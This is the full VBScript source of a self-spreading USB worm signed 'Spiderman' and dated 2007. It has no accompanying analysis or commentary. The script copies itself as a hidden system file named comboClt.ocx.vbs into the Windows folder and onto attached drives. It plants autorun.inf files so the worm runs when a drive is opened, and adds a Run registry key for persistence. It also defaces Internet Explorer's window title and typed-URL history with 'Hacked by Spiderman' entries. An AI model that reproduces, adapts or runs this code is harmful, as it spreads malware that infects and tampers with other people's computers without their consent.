'Spiderman is coming!!
    
    On Error Resume Next
    
    Dim mysource, winpath, flashdrive, fs, mf, atr, tf, rg, nt, check, sd,name1,name2, name3, name4, name5, name6
    Dim text, size
    
    name1 = "\comboClt.ocx.v"
    name2 = "bs"
    name3 = "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\W"
    name4 = "indow Title"
    name5 = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\R"
    name6 = "un\MicrosoftComboBoxControl"
	
    atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe comboClt.ocx.vbs"
    
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set mf = fs.getfile(Wscript.ScriptFullname)
    
    size = mf.size
    check = mf.Drive.drivetype
    
    Set text = mf.openastextstream(1, -2)
    
    Do While Not text.atendofstream
        mysource=mysource&text.readline
        mysource = mysource & vbCrLf
    Loop
    
    Do
        Set winpath = fs.getspecialfolder(0)
        Set tf = fs.getfile(winpath & name1 & name2)
        tf.Attributes = 32
        Set tf = fs.createtextfile(winpath & name1 & name2, 2, True)
        tf.write mysource
        tf.Close
        Set tf = fs.getfile(winpath & name1 & name2)
        tf.Attributes = 39
        
        For Each flashdrive In fs.drives
            If (flashdrive.drivetype = 3-2 Or flashdrive.drivetype = 4-2) And flashdrive.Path <> "A:" Then
                Set tf = fs.getfile(flashdrive.Path & name1 & name2)
                tf.Attributes = 32
                Set tf = fs.createtextfile(flashdrive.Path & name1 & name2, 2, True)
                tf.write mysource
                tf.Close
                Set tf = fs.getfile(flashdrive.Path & name1 & name2)
                tf.Attributes = 39
                Set tf = fs.getfile(flashdrive.Path & "\autorun.inf")
                tf.Attributes = 32
                Set tf = fs.createtextfile(flashdrive.Path & "\autorun.inf", 2, True)
                tf.write atr
                tf.Close
                Set tf = fs.getfile(flashdrive.Path & "\autorun.inf")
                tf.Attributes = 39
            End If
        Next
        
        Set rg = CreateObject("WScript.Shell")
        rg.regwrite name3 & name4,"Hacked by Spiderman 2007-June-10)"
        rg.regwrite name5 & name6,winpath&"\comboClt.ocx.vbs"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url1","www.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url2","http://You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url3","http://www.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url4","google.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url5","yahoo.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url6","msn.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url7","baidu.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url8","microsoft.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url9","hotmail.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url10","yahoo.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url11","www.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url12","http://You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url13","http://www.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url14","google.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url15","yahoo.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url16","msn.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url17","baidu.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url18","microsoft.You were Hacked by Spiderman~~!!! (2007-June-10)"
        rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs\url19","hotmail.You were Hacked by Spiderman~~!!! (2007-June-10)"

        
        If check <> 1 Then
            Wscript.sleep 500000
        End If
        
    Loop While check <> 1
    
    Set sd = CreateObject("Wscript.shell")
    sd.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
